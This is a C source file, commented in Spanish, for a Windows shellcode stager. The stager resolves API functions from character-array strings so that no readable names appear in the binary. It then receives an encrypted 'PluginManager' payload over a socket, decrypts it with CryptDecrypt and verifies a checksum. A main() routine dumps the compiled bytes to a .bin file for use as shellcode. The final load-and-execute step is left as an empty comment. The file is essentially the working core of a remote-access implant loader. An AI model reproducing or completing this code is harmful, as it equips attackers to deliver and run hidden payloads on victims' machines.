#include <windows.h>
#include <stdio.h>

typedef HMODULE (WINAPI *_LoadLibraryA)(LPCTSTR lpFileName);
typedef FARPROC (WINAPI *_GetProcAddress)(HMODULE hModule, LPCTSTR lpProcName);

//ws2_32.dll
typedef int (WINAPI *_recv)(SOCKET s, char *buf, int len, int flags);
typedef int (WINAPI *_send)(SOCKET s, const char *buf, int len, int flags);
//advapi32.dll
typedef BOOL (WINAPI *_CryptDecrypt)(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen);
//msvcrt.dll
typedef void * (__cdecl *_malloc)(size_t _Size);

struct SHELLCODE_CONTEXT{
    //HMODULE             KERNEL32;
    _LoadLibraryA       LoadLibraryA_;
    _GetProcAddress     GetProcAddressA_;
    HMODULE             WS2_32;
    _recv               recv_;
    _send               send_;
    HMODULE             ADVAPI32;
    _CryptDecrypt       CryptDecrypt_;
    HMODULE             MSVCRT;
    _malloc             malloc_;
    /**/
    SOCKET              hSocket;
    HCRYPTKEY           hKey;
};

void scInit(_LoadLibraryA pLoadLibA, _GetProcAddress pGPA, SOCKET hSocket, HCRYPTKEY hKEY);
void Start(_LoadLibraryA pLoadLibA, _GetProcAddress pGPA, SOCKET hSocket, HCRYPTKEY hKEY);
void Payload(SHELLCODE_CONTEXT *scc);


void __declspec(naked) Start(_LoadLibraryA pLoadLibA, _GetProcAddress pGPA, SOCKET hSocket, HCRYPTKEY hKEY){
    __asm{
        jmp scInit
    }
}

void Payload(SHELLCODE_CONTEXT *scc){
    //Enviamos el OK al cliente.
    char ok = {0x1};
    scc->send_(scc->hSocket, &ok, sizeof(char), 0);

    //Recibimos el tamaño del PluginManager
    DWORD dwSize;
    scc->recv_(scc->hSocket, (char*)&dwSize, sizeof(DWORD), 0);

    //Hacemos sitio para almacenar el PluginManager
    char* bBuff = (char*)scc->malloc_(dwSize);
    if (bBuff){
        #define MSG_WAITALL 0x8
        //Recibimos el PluginManager
        scc->recv_(scc->hSocket, (char*)bBuff, dwSize, MSG_WAITALL);
        DWORD dwDSize = dwSize;

        //Lo desciframos
        if (scc->CryptDecrypt_(scc->hKey, 0, true, 0, (BYTE*)bBuff, &dwDSize) == 1){
            //Procedemos a comprobar el Checksum
            DWORD oChecksum = *(DWORD*)bBuff;
            //Saltamos el Checksum de los datos recibidos
            bBuff += 4;
            DWORD nChecksum = 0;

            for(DWORD i = 0; i < dwSize-4;i++){
                nChecksum ^= (BYTE)bBuff[i];
                nChecksum *= 0x1EF30EB;
            };

            //Si el checksum coincide
            if (nChecksum == oChecksum){
                //Cargamos y ejecutamos el PluginManager
            }
        }
    }
    return;
}

void scInit(_LoadLibraryA pLoadLibA, _GetProcAddress pGPA, SOCKET hSocket, HCRYPTKEY hKEY){
    SHELLCODE_CONTEXT scc;

    scc.LoadLibraryA_       = pLoadLibA;
    scc.GetProcAddressA_    = pGPA;
    scc.hSocket             = hSocket;
    scc.hKey                = hKEY;

    //char sKERNEL32[] = {'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '\0'};
    char sADVAPI32[]        = {'a', 'd', 'v', 'a', 'p', 'i', '3', '2', '\0'};
    char sCryptDecrypt[]    = {'C', 'r', 'y', 'p', 't', 'D', 'e', 'c', 'r', 'y', 'p', 't', '\0'};

    char sWS2_32[]          = {'w', 's', '2', '_', '3', '2', '\0'};
    char ssend[]            = {'s', 'e', 'n', 'd', '\0'};
    char srecv[]            = {'r', 'e', 'c', 'v', '\0'};

    char sMSVCRT[]          = {'m', 's', 'v', 'c', 'r', 't', '\0'};
    char smalloc[]          = {'m', 'a', 'l', 'l', 'o', 'c', '\0'};

    scc.ADVAPI32            = scc.LoadLibraryA_(sADVAPI32);
    scc.CryptDecrypt_       = (_CryptDecrypt)scc.GetProcAddressA_(scc.ADVAPI32, sCryptDecrypt);

    scc.WS2_32              = scc.LoadLibraryA_(sWS2_32);
    scc.send_               = (_send)scc.GetProcAddressA_(scc.WS2_32, ssend);
    scc.recv_               = (_recv)scc.GetProcAddressA_(scc.WS2_32, srecv);

    scc.MSVCRT              = scc.LoadLibraryA_(sMSVCRT);
    scc.malloc_             = (_malloc)scc.GetProcAddressA_(scc.MSVCRT, smalloc);

    Payload(&scc);
    return;
}


//Código utilizado para generar ".bin" y debuggear la shellcode
int main(int argc, char **argv){
    FILE *pfBin;
    size_t dwSize;
    char szBinFile[MAX_PATH];

    dwSize = (PBYTE)main - (PBYTE)Start;

    sprintf_s(szBinFile, MAX_PATH, "%s.bin", argv[0]);
    
    fopen_s(&pfBin, szBinFile, "wb");
    fwrite((PBYTE)Start, dwSize, 1, pfBin);
    fclose(pfBin);

    //Start(&LoadLibraryA, &GetProcAddress, 0, 0);

    return 0;
}